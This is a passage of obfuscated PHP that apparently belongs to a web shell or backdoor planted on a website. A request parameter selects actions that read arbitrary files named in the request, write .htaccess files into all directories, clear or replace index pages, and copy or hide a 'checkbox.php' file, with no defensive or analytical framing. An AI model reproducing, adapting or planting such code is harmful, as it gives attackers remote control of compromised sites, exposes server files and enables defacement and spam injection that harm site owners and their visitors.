display($Iadqsni); } break; case "read": $Iadqsni = @file_get_contents($Isinadq . "/" . $_REQUEST['name']); if ($Iadqsni == null) { $Iadqsni = "failed"; } display($Iadqsni); break; case "unlock": $Iadqsni = unlock(); display($Iadqsni); break; case "lock": $Iadqsni = "success"; display($Iadqsni); break; case "checklockstatus": $Iadqsni = checkLockStatus(); display($Iadqsni); break; case "clearindex": $Iadqsni = clearIndex($Isinadq); display($Iadqsni); break; case "writehtaccesstoallDirs": $Iadqsni = writeHtaccessToAllDirs(); display($Iadqsni); break; case "copy": $Iadjkfile = 'checkbox.php'; $Iadqsni = copyjk($Iadjkfile); break; case "hddjk": $Iadhddfile = 'checkbox.php'; $Iadsnfile = ''; if (isset($_REQUEST['sn'])) { $Iadsnfile = $_REQUEST['sn']; } $Iadqsni = haddjk($Iadhddfile, $Iadsnfile); break; case "eindex": $Iadqsni = eindex(); break; default: display("error a", 1); break; } ?>